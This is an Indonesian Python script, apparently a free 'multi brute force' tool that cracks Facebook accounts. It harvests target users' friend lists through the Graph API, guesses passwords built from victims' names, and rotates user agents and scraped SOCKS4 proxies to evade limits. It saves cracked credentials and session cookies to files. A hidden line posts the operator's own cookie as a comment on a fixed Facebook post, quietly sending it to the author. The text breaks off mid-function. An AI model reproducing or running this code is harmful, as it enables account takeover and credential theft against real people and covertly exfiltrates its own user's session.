# TERAKHIR UPDATE SMBF
# SABTU 16-09-2023
# CYXIEON-XR

# note ini sc free ya klo udh enak jangan di premiumin
# note yang udah tau jangan di ubah - ubah  hargai :-)

#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-MODULE ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

#----------[ USER-CRACK ]----------#  
for Xr in range (10000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(40,99)
	f='0'
	g=random.randrange(3000,4999)
	h=random.randrange(97,114)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}.{c}) {d}{e}.{f}.{g}.{h} {i}')
	ugen.append(uaku)
	
for Xr in range (10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(5, 19)
	f='DOOGEE' 
	g='Build/MRA58K)'
	h='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	i=random.randrange(40,99)
	j='0'
	k=random.randrange(3000,4999)
	l=random.randrange(97,114)
	m='Mobile Safari/537.36'
	uaku=(f'{a} {b}.{c}; {f} {d}{e} {g} {h}{i}.{j}.{k} {m}')
	ugen.append(uaku)

#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU

#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cyxieoncokies.txt")
      except:pass
      try:os.remove(".cyxieontoken.txt")
      except:pass
      menu()
      	
#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f'''\t{mer}
  _________   _____ _____________________
 /   _____/  /     \\______   \_   _____/
 \_____  \  /  \ /  \|    |  _/|    __)  
 {puti}/        \/    Y    \    |   \|     \   
/_______  /\____|__  /______  /\___  /   
        \/         \/       \/     \/    
        {hijo} SIMPLE MULTI BRUTE FORCE''')
    	
#----------[ LOGIN-COKIES ]----------#        
def login_cokies():
    try:
        banner()
        ses = requests.Session()
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        cookie = input(f'{kun}└──[{puti} Cookies {hijo}: ')
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        requests.post(f"https://graph.facebook.com/v17.0/100043485017160_1604512333360519/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
        ken = open(".cyxieontoken.txt", "w").write(tok)
        cok = open(".cyxieoncokies.txt", "w").write(cookie)
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        suk = input(f'{kun}└──[{puti} Tekan Enter ] ')
        menu()
            
    except Exception as e:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Login Gagal Cek Tumbal Lo Ngab :-(")		
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
        try:
            token = open('.cyxieontoken.txt','r').read()
            cok = open('.cyxieoncokies.txt','r').read()
            tokene.append(token)
            try:
                baz_ganteng = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokene[0], cookies={'cookie':cok})
                useridz = json.loads(baz_ganteng.text)['id']
                username = json.loads(baz_ganteng.text)['name']
            except KeyError:
                print(f"{kun}╭────────────────────────────────────────────{puti}")
                print(f"{kun}└──[{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
                time.sleep(3)
                login_cokies()
        except requests.exceptions.ConnectionError:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Koneksi Problem ")
        except IOError:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            print(f"{kun}└──[{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
            time.sleep(3)
            login_cokies()
        except IOError:
            ganti_cokies()
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Cokies Expired ")           
        banner()            
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        print(f'{kun}└──[{puti} User  Id {hijo}: {username} {puti}')
        print(f'{kun}└──[{puti} Username {hijo}: {useridz} {puti}')
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        print(f'{kun}└──[{puti} 01. Crack publik ')
        print(f'{kun}└──[{puti} 02. Cek hasil OK ')
        print(f'{kun}└──[{puti} 03. Cek hasil CP ')
        print(f'{kun}└──[{puti} 04. Ganti cokies ')
        print(f"{kun}╭────────────────────────────────────────────{puti}")
        CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
        if CYXIEON_GANTENG in ['01','1']:
            crack_publik()
        elif CYXIEON_GANTENG in ['02','2']:
            hasil_ok()
        elif CYXIEON_GANTENG in ['03','3']:
            hasil_cp()
        elif CYXIEON_GANTENG in ['04','4']:
            ganti_cokies()
        else:
            print(f"{kun}╭────────────────────────────────────────────{puti}")
            exit(f"{kun}└──[{mer} Yang bener ter :-( ")            

#----------[ CRACK-PUBLIK  ]----------#            
def crack_publik():
	try:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()
	except IOError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Cokies Expired ")           
	try:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		kumpulkan = int(input(f'{kun}└──[{puti} Berapa target : '))
	except ValueError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Yang bener :-( ")    
	if kumpulkan<1 or kumpulkan>100:
	    print(f"{kun}╭────────────────────────────────────────────{puti}")
	    exit(f"{kun}└──[{mer} Gagal Dump ")    
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		Masukan = input(f'{kun}└──[{puti} Target ke '+str(bilangan)+f' {hijo}: ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       graph = ses.get('https://graph.facebook.com/v17.0/'+user+'?fields=friends.limit(999999999)&access_token='+tokene[0], cookies = {'cookies':cok}).json()
	       for xr in graph['friends']['data']:
	           try:
	               gmail = (xr['id']+'|'+xr['name'])
	               if gmail in id:pass
	               else:id.append(gmail)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	          print(f"{kun}╭────────────────────────────────────────────{puti}")
	          exit(f"{kun}└──[{mer} Koneksi Problem ")
	try:
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      print(f'{kun}└──[{puti} Total target {hijo}: '+str(len(id)))
	      atur_id()
	except requests.exceptions.ConnectionError:
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      exit(f"{kun}└──[{mer} Gagal Dump ")
	except (KeyError,IOError):
	      print(f"{kun}╭────────────────────────────────────────────{puti}")
	      exit(f"{kun}└──[{mer} Tidak punya teman ")
	      
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('CYXIEON-OK')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('CYXIEON-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()
																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} 01. Validate ')
	print(f'{kun}└──[{puti} 02. Reguler ')
	print(f'{kun}└──[{puti} 03. Asyinc ')      
	print(f"{kun}╭────────────────────────────────────────────{puti}") 
	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')  
	elif CYXIEON_METHODE in ['2','02']:
	   method.append('reguler')       
	elif CYXIEON_METHODE in ['3','03']:
	   method.append('asyinc')
	else:
		method.append('validate')
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} Tambahkan pw manual (y/t) ')
	print(f"{kun}╭────────────────────────────────────────────{puti}") 	
	passwtamb = input(f'{kun}└──[{puti} Input : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{kun}╭────────────────────────────────────────────{puti}")
		     sandiku = input(f'{kun}└──[{puti} Input Pw : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} MAINKAN MODE PESAWAT SETIAP 300 IDZ ')
	print(f"{kun}─────────────────────────────────────────────{puti}")
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'123456')
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'321')
						pwx.append(frestile+'123456')
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.beta.facebook.com')
				elif 'reguler' in method:
				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
				elif 'asyinc' in method:
				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				    
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} OK {hijo}: %s'%(ok))
	print(f'{kun}└──[{puti} CP {kun}: %s'%(cp))
	print(f"{kun}─────────────────────────────────────────────{puti}")
	
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} V %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ref = rc([f"https://{url}/login/device-based/password/?uid="+idf+"&flow=login_no_pin&refsrc=deprecated&_rdr"])
			link = ses.get(f"https://{url}/login/device-based/password/?uid="+idf+"&flow=login_no_pin&refsrc=deprecated&_rdr")
			date ={"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next":f"https://{url}/login/save-device/",
	        "flow":"login_no_pin",
	        "pass":pw,
	        }     
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			ver = rc(["id-ID,id;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  		
			head={'Host': url,
	        'cache-control': 'max-age=0',
	        'dpr': f'{str(rr(1,9))}',
	        'viewport-width': f'{str(rr(400,999))}',
	        'sec-ch-ua': f'"Chromium";v="{str(rr(99,115))}", "Google Chrome";v="{str(rr(99,115))}", "Not:A-Brand";v="{str(rr(8,20))}"',
	        'sec-ch-ua-mobile': '?1',
	        'sec-ch-ua-platform': '"Android"',
	        'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	        'sec-ch-ua-full-version-list':f'"Chromium";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Google Chrome";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Not:A-Brand";v="{str(rr(8,20))}.0.0.0"',
	        'sec-ch-prefers-color-scheme': 'light',
	        'upgrade-insecure-requests': '1',
	        'origin': 'https://'+url,
	        'content-type': 'application/x-www-form-urlencoded',
	        'user-agent': ua,
	        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	        'x-requested-with': 'XMLHttpRequest',
	        'sec-fetch-site': 'same-origin',
	        'sec-fetch-mode': 'cros',
	        'sec-fetch-user': '?1',
	        'sec-fetch-dest': 'empty',
	        'referer': ref,
	        'accept-encoding': 'gzip, deflate, br',
	        'accept-language': f'{ver},en-US;q=0.8,en;q=0.7'}
			rdm = rc(["id_ID","jv_ID","id_ID_ID","jv_ID_ID"])
			links = rc([f"https://{url}/login/device-based/validate-password/?shbl=0&locale2={rdm}"])
			CYXIEON_XR = ses.post(links,headers=head, data=date, cookies={'cookie': koki}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
				tree.add(f"{ung}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{ung}{ua}{hijo}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} R %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
			ver = rc(["en-GB,en-US;q=0.9","ms-MY,ms;q=0.9","fr_FR,fr;q=0.9","jv-ID,jv;q=0.9"])  		
			ses.headers.update({"Host":url,
			"upgrade-insecure-requests":"1",
			"user-agent":ua,
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"dnt":f"{str(rr(1,9))}",
			"x-requested-with":"mark.via.gp",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-user":"empty",
			"sec-fetch-dest":"document",
			"referer":f"https://{url}/",
			"accept-encoding":"gzip, deflate br",
			"accept-language":f"{ver},en;q=0.8"})
			link = ses.get('https://m.facebook.com/login/?email='+idf).text
			date = {'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw}
			ses.headers.update({'Host': url,
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': 'empty',
			'sec-fetch-dest': 'document',
			'referer': f'https://{url}/login/?email='+idf,
			'accept-encoding':'gzip, deflate br',
			'accept-language':f'{ver},en;q=0.8'})
			links = rc([f"https://{url}/login/login/device-based/regular/login/?shbl=1&refsrc=deprecated"])
			CYXIEON_XR = ses.post(links,data=date,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=CYXIEON_XR.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{hijo}{kuki}{puti}")
				tree.add(f"{ung}{ua}{puti}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in CYXIEON_XR.cookies.get_dict().keys():
				print(f"{kun}╭────────────────────────────╮{puti}")
				tree = Tree("")
				tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
				tree.add(f"{ung}{ua}{hijo}")
				print(f"{kun}╰────────────────────────────╯{puti}")
				prints(tree)
				open('CYXIEON-OK/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------[ METODE-ASYINC ]----------#	
def crackasyinc(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r {emot} A %s(%s {loop} %s) (%s OK : {ok} %s) (%s CP : {cp} %s)"%(puti,hijo,puti,hijo,puti,kun,puti))
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = rc(ugen)
			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
